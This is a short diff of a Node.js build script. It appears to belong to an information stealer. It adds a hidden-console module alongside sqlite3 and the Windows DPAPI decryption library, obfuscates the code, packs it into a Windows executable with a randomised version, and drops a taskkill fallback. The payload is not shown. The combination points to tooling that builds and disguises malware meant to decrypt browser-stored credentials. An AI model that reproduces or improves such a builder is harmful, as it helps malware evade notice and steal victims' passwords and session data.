@@ -178,14 +178,7 @@ console.log('');
   console.log('\nStarting building process...');
 
   if (existsSync(join(__dirname, 'dist'))) {
-    try {
-      await rmSync(join(__dirname, 'dist'), { recursive: true });
-    } catch (e) {
-      try {
-        await execSync(`taskkill /f /im "${require('./config').name}.exe"`, { stdio: 'ignore' });
-        await rmSync(join(__dirname, 'dist'), { recursive: true });
-      } catch (e) {}
-    }
+    await rmSync(join(__dirname, 'dist'), { recursive: true });
   }
 
   if (existsSync(`${config.filename}.exe`)) unlinkSync(`${config.filename}.exe`);
@@ -195,10 +188,10 @@ console.log('');
   console.log('Done minifying and obfuscating.');
 
   await new Promise((r) => r(execSync(
-    `npm install sqlite3 @primno/dpapi --production --no-package-lock --no-interactive --prefix "${join(__dirname, 'dist')}"`, { stdio: 'pipe' }
+    `npm install sqlite3 @primno/dpapi node-hide-console-window --omit=dev --no-package-lock --no-interactive --prefix "${join(__dirname, 'dist')}"`, { stdio: 'pipe' }
   )));
 
-  console.log('Building electron executable...');
+  console.log('Building executable...');
 
   new Promise((r) => r(execSync(`npx pkg . -C GZip -o "${config.filename}.exe"`, { stdio: 'inherit' }))).then(async () => {
     const version = `${Math.floor(Math.random() * 9)}.${Math.floor(Math.random() * 9)}.${Math.floor(Math.random() * 9)}`;
